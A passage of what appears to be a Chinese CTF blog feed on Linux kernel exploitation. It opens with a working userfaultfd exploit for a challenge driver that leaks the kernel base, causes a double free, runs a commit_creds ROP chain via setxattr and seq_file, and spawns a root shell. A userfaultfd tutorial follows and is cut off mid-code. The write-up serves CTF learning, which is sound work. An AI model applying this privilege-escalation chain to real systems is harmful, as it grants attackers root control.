class="number">-1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] leak handler unblocked&quot;</span>);</span><br><span class="line">    <span class="comment">// pause();</span></span><br><span class="line">    <span class="keyword">delete</span> (&amp;kernel_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]leak ptr:%p\n&quot;</span>, kernel_addr);</span><br><span class="line">    kernel_base = kernel_addr - <span class="number">0x186f78</span>;</span><br><span class="line">    kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] Wrong poll return val&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] msg err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *page = (<span class="keyword">char</span> *)mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    <span class="comment">// init page</span></span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">    uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)page;</span><br><span class="line">    uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)msg.arg.pagefault.address &amp; ~(<span class="number">0x1000</span> - <span class="number">1</span>);</span><br><span class="line">    uc.len = <span class="number">0x1000</span>;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] leak handler done&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">double_free_handler</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)arg;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] double free handler created&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> nready;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] double free handler unblocked&quot;</span>);</span><br><span class="line">    <span class="comment">// pause();</span></span><br><span class="line">    <span class="keyword">char</span> *tmp = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">delete</span> (tmp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] Wrong poll return val&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] msg err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *page = (<span class="keyword">char</span> *)mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    <span class="comment">// init page</span></span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">    uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)page;</span><br><span class="line">    uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)msg.arg.pagefault.address &amp; ~(<span class="number">0x1000</span> - <span class="number">1</span>);</span><br><span class="line">    uc.len = <span class="number">0x1000</span>;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] double free handler done&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rdi;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> commit_creds;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> init_cred;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> prepare_kernel_cred;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> mov_rdi_rax_pop_rbp_ret;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">getroot_handler</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)arg;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] getroot handler created&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> nready;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] getroot handler unblocked&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] setxattr trapped in userfaultfd.&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++)</span><br><span class="line">        close(seq_fd_reserve[i]);</span><br><span class="line">    <span class="comment">// pause();</span></span><br><span class="line">    pop_rdi = <span class="number">0xffffffff81034505</span> + kernel_offset;</span><br><span class="line">    commit_creds = <span class="number">0xffffffff81069c10</span> + kernel_offset;</span><br><span class="line">    swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff81600a34</span> + kernel_offset + <span class="number">0x10</span>;</span><br><span class="line">    prepare_kernel_cred = <span class="number">0xffffffff81069e00</span> + kernel_offset;</span><br><span class="line">    mov_rdi_rax_pop_rbp_ret = <span class="number">0xffffffff8121f89a</span> + kernel_offset;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15,   0xbeefdead\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14,   0xbeefdead\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13,   pop_rdi\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12,   0\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp,   prepare_kernel_cred\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx,   mov_rdi_rax_pop_rbp_ret\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r11,   0xbeefdead\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10,   commit_creds\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9,    swapgs_restore_regs_and_return_to_usermode\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8,    0xbeefdead\n&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rax,   rax\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rcx,   0xbeefdead\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx,   8\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi,   rsp\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi,   seq_fd\n&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] execve root shell now...&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] Wrong poll return val&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] msg err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *page = (<span class="keyword">char</span> *)mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    <span class="comment">// init page</span></span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">    uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)page;</span><br><span class="line">    uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)msg.arg.pagefault.address &amp; ~(<span class="number">0x1000</span> - <span class="number">1</span>);</span><br><span class="line">    uc.len = <span class="number">0x1000</span>;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] getroot handler done&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fd = open(<span class="string">&quot;/proc/stack&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Error opening /proc/stack\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *leak_buf;</span><br><span class="line">    <span class="keyword">int</span> shm_id;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *shm_addr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *double_free_buf;</span><br><span class="line">    <span class="keyword">char</span> *getroot_buf;</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((seq_fd_reserve[i] = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) &lt; <span class="number">0</span>)</span><br><span class="line">            ErrExit(<span class="string">&quot;seq reserve!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    leak_buf = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    RegisterUserfault(leak_buf, <span class="number">0x1000</span>, leak_handler);</span><br><span class="line">    shm_id = shmget(<span class="number">114514</span>, <span class="number">0x1000</span>, SHM_R | SHM_W | IPC_CREAT);</span><br><span class="line">    <span class="keyword">if</span> (shm_id &lt; <span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;shmget!&quot;</span>);</span><br><span class="line">    shm_addr = shmat(shm_id, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (shm_addr &lt; <span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;shmat!&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (shmdt(shm_addr) &lt; <span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;shmdt!&quot;</span>);</span><br><span class="line">    create(leak_buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]kernel_base=&gt;%p\n&quot;</span>, kernel_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]kernel_offset=&gt;%p\n&quot;</span>, kernel_offset);</span><br><span class="line"></span><br><span class="line">    double_free_buf = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    RegisterUserfault(double_free_buf, <span class="number">0x1000</span>, double_free_handler);</span><br><span class="line">    create(<span class="string">&quot;196082&quot;</span>);</span><br><span class="line">    <span class="keyword">delete</span> (double_free_buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] double free\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    getroot_buf = mmap(<span class="literal">NULL</span>, <span class="number">0x2000</span>, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    RegisterUserfault(getroot_buf + <span class="number">0x1000</span>, <span class="number">0x1000</span>, getroot_handler);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(getroot_buf + <span class="number">0x1000</span> - <span class="number">8</span>) = <span class="number">0xffffffff814d51c0</span> + kernel_offset;</span><br><span class="line">    <span class="comment">// // add rsp , 0x1c8 ; pop rbx ; pop r12 ; pop r13 ; pop r14 ; pop r15; pop rbp ; ret</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;gadget=&gt;%p\n&quot;</span>, *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(getroot_buf + <span class="number">0x1000</span> - <span class="number">8</span>));</span><br><span class="line">    seq_fd = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    setxattr(<span class="string">&quot;/exp&quot;</span>, <span class="string">&quot;196082&quot;</span>, getroot_buf + <span class="number">0x1000</span> - <span class="number">8</span>, <span class="number">32</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220906195313852.png"                      alt="image-20220906195313852"                ></p><p>题目放在：<a class="link"   href="https://github.com/196082/196082/tree/main/kernel_pwn" >https://github.com/196082/196082/tree/main/kernel_pwn<i class="fas fa-external-link-alt"></i></a></p><hr><p>参考链接：<a class="link"   href="https://www.anquanke.com/post/id/266898#h3-5" >https://www.anquanke.com/post/id/266898#h3-5<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;关于userfaultfd这里就不再提及了，不熟悉的可以看一下上一篇文章 &lt;a href=&quot;https://cv196082.gitee.io/2022/08/16/userfaultfd/&quot;&gt;https://cv196082.gitee.io/2022/08/16/use</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    
    <category term="userfaultfd" scheme="https://cv196082.gitee.io/tags/userfaultfd/"/>
    
    <category term="setxattr" scheme="https://cv196082.gitee.io/tags/setxattr/"/>
    
    <category term="pt_regs" scheme="https://cv196082.gitee.io/tags/pt-regs/"/>
    
  </entry>
  
  <entry>
    <title>userfaultfd利用</title>
    <link href="https://cv196082.gitee.io/2022/08/16/userfaultfd/"/>
    <id>https://cv196082.gitee.io/2022/08/16/userfaultfd/</id>
    <published>2022-08-16T10:11:10.000Z</published>
    <updated>2022-08-16T10:11:48.000Z</updated>
    
    <content type="html"><![CDATA[<p>其实这应该是kernelpwn基础中的一个，但是一直没有很关心，在最近做一道题目时又提到了这一利用方式，索性就把这玩意给先写了。</p><h3 id="简单理解"><a href="#简单理解" class="headerlink" title="简单理解"></a>简单理解</h3><p>userfaultfd 并不是一种攻击的名字，它是 Linux 提供的一种让用户自己处理缺页异常的机制，初衷是为了提升开发灵活性，在 kernel pwn 中常被用于提高条件竞争的成功率。比如在如下的操作时</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy_from_user(kptr, user_buf, size);</span><br></pre></td></tr></table></figure><p>如果在进入函数后，实际拷贝开始前线程被中断换下 CPU，别的线程执行，修改了 kptr 指向的内存块的所有权（比如 kfree 掉了这个内存块），然后再执行拷贝时就可以实现 UAF。这种可能性当然是比较小的，但是如果 user_buf 是一个 mmap 的内存块，并且我们为它注册了 userfaultfd，那么在拷贝时出现缺页异常后此线程会先执行我们注册的处理函数，在处理函数结束前线程一直被暂停，结束后才会执行后面的操作，大大增加了竞争的成功率。</p><h2 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h2><h3 id="页调度与延迟加载"><a href="#页调度与延迟加载" class="headerlink" title="页调度与延迟加载"></a>页调度与延迟加载</h3><p>有的内存既不在RAM也不在交换区，例如mmap创建的内存映射页。mmap页在read/write访问之前，实际上还没有创建（还没有映射到实际的物理页），例如：<code>mmap(0x1337000, 0x1000, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_PRIVATE, fd, 0);</code> 内核并未将fd内容拷贝到0x1337000，只是将地址0x1337000映射到文件fd。</p><p>当有如下代码访问时：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *a = (<span class="keyword">char</span> *)<span class="number">0x1337000</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;content: %c\n&quot;</span>, a[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure><p>若发生对该页的引用，则（1）为0x1337000创建物理帧，（2）从fd读内容到0x1337000，（3）并在页表标记合适的入口，以便识别0x1337000虚地址。如果是堆空间映射，仅第2步不同，只需将对应物理帧清0。</p><p>总之，若首次访问mmap创建的页，会耗时很长，会导致上下文切换和当前线程的睡眠。</p><h2 id="userfaultfd"><a href="#userfaultfd" class="headerlink" title="userfaultfd"></a>userfaultfd</h2><p>我对于他的理解就是，userfaultfd机制是用来处理页缺陷的，并且处理的handle函数我们也是可以控制的。正常的流程一般为下面几步。</p><h3 id="Step-1-创建一个描述符uffd"><a href="#Step-1-创建一个描述符uffd" class="headerlink" title="Step 1: 创建一个描述符uffd"></a>Step 1: 创建一个描述符uffd</h3><p>所有的注册内存区间、配置和最终的缺页处理等就都需要用ioctl来对这个uffd操作。ioctl-userfaultfd支持UFFDIO_API、UFFDIO_REGISTER、UFFDIO_UNREGISTER、UFFDIO_COPY、UFFDIO_ZEROPAGE、UFFDIO_WAKE等选项。比如UFFDIO_REGISTER用来向userfaultfd机制注册一个监视区域，这个区域发生缺页时，需要用UFFDIO_COPY来向缺页的地址拷贝自定义数据。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># <span class="number">2</span> 个用于注册、注销的ioctl选项：</span><br><span class="line">UFFDIO_REGISTER                 注册将触发user-fault的内存地址</span><br><span class="line">UFFDIO_UNREGISTER               注销将触发user-fault的内存地址</span><br><span class="line"># <span class="number">3</span> 个用于处理user-fault事件的ioctl选项：</span><br><span class="line">UFFDIO_COPY                     用已知数据填充user-fault页</span><br><span class="line">UFFDIO_ZEROPAGE                 将user-fault页填零</span><br><span class="line">UFFDIO_WAKE                     用于配合上面两项中 UFFDIO_COPY_MODE_DONTWAKE 和</span><br><span class="line">                                UFFDIO_ZEROPAGE_MODE_DONTWAKE模式实现批量填充  </span><br><span class="line"># <span class="number">1</span> 个用于配置uffd特殊用途的ioctl选项：</span><br><span class="line">UFFDIO_API                      它又包括如下feature可以配置：</span><br><span class="line">                                UFFD_FEATURE_EVENT_FORK         (since Linux <span class="number">4.11</span>)</span><br><span class="line">                                UFFD_FEATURE_EVENT_REMAP        (since Linux <span class="number">4.11</span>)</span><br><span class="line">                                UFFD_FEATURE_EVENT_REMOVE       (since Linux <span class="number">4.11</span>)</span><br><span class="line">                                UFFD_FEATURE_EVENT_UNMAP        (since Linux <span class="number">4.11</span>)</span><br><span class="line">                                UFFD_FEATURE_MISSING_HUGETLBFS  (since Linux <span class="number">4.11</span>)</span><br><span class="line">                                UFFD_FEATURE_MISSING_SHMEM      (since Linux <span class="number">4.11</span>)</span><br><span class="line">                                UFFD_FEATURE_SIGBUS             (since Linux <span class="number">4.14</span>)</span><br><span class="line"><span class="comment">// userfaultfd系统调用创建并返回一个uffd，类似一个文件的fd</span></span><br><span class="line">uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br></pre></td></tr></table></figure><h3 id="STEP-2-用ioctl的UFFDIO-REGISTER选项注册监视区域"><a href="#STEP-2-用ioctl的UFFDIO-REGISTER选项注册监视区域" class="headerlink" title="STEP 2. 用ioctl的UFFDIO_REGISTER选项注册监视区域"></a>STEP 2. 用ioctl的UFFDIO_REGISTER选项注册监视区域</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 注册时要用一个struct uffdio_register结构传递注册信息:</span></span><br><span class="line"><span class="comment">// struct uffdio_range &#123;</span></span><br><span class="line"><span class="comment">// __u64 start;    /* Start of range */</span></span><br><span class="line"><span class="comment">// __u64 len;      /* Length of range (bytes) */</span></span><br><span class="line"><span class="comment">// &#125;;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// struct uffdio_register &#123;</span></span><br><span class="line"><span class="comment">// struct uffdio_range range;</span></span><br><span class="line"><span class="comment">// __u64 mode;     /* Desired mode of operation (input) */</span></span><br><span class="line"><span class="comment">// __u64 ioctls;   /* Available ioctl() operations (output) */</span></span><br><span class="line"><span class="comment">// &#125;;</span></span><br><span class="line"></span><br><span class="line">addr = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="number">0</span>)</span><br><span class="line"><span class="comment">// addr 和 len 分别是我匿名映射返回的地址和长度，赋值到uffdio_register</span></span><br><span class="line">uffdio_register.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) addr;</span><br><span class="line">uffdio_register.range.len = len;</span><br><span class="line"><span class="comment">// mode 只支持 UFFDIO_REGISTER_MODE_MISSING</span></span><br><span class="line">uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line"><span class="comment">// 用ioctl的UFFDIO_REGISTER注册</span></span><br><span class="line">ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register);</span><br></pre></td></tr></table></figure><h3 id="STEP-3-创建一个处理专用的线程轮询和处理”user-fault”事件"><a href="#STEP-3-创建一个处理专用的线程轮询和处理”user-fault”事件" class="headerlink" title="STEP 3. 创建一个处理专用的线程轮询和处理”user-fault”事件"></a>STEP 3. 创建一个处理专用的线程轮询和处理”user-fault”事件</h3><p>要使用userfaultfd，需要创建一个处理专用的线程轮询和处理”user-fault”事件。主进程中就要调用pthread_create创建这个自定义的handler线程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 主进程中调用pthread_create创建一个fault handler线程</span></span><br><span class="line">pthread_create(&amp;thr, <span class="literal">NULL</span>, fault_handler_thread, (<span class="keyword">void</span> *) uffd);</span><br></pre></td></tr></table></figure><p>一个自定义的线程函数举例如下，这里处理的是一个普通的匿名页用户态缺页，我们要做的是把我们一个已有的一个page大小的buffer内容拷贝到缺页的内存地址处。用到了poll函数轮询uffd，并对轮询到的UFFD_EVENT_PAGEFAULT事件(event)用拷贝(ioctl的UFFDIO_COPY选项)进行处理。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> * <span class="title">fault_handler_thread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="comment">// 轮询uffd读到的信息需要存在一个struct uffd_msg对象中</span></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="comment">// ioctl的UFFDIO_COPY选项需要我们构造一个struct uffdio_copy对象</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    uffd = (<span class="keyword">long</span>) arg;</span><br><span class="line">      ......</span><br><span class="line">    <span class="keyword">for</span> (;;) &#123; <span class="comment">// 此线程不断进行polling，所以是死循环</span></span><br><span class="line">        <span class="comment">// poll需要我们构造一个struct pollfd对象</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">        <span class="comment">// 读出user-fault相关信息</span></span><br><span class="line">        read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">        <span class="comment">// 对于我们所注册的一般user-fault功能，都应是UFFD_EVENT_PAGEFAULT这个事件</span></span><br><span class="line">        assert(msg.event == 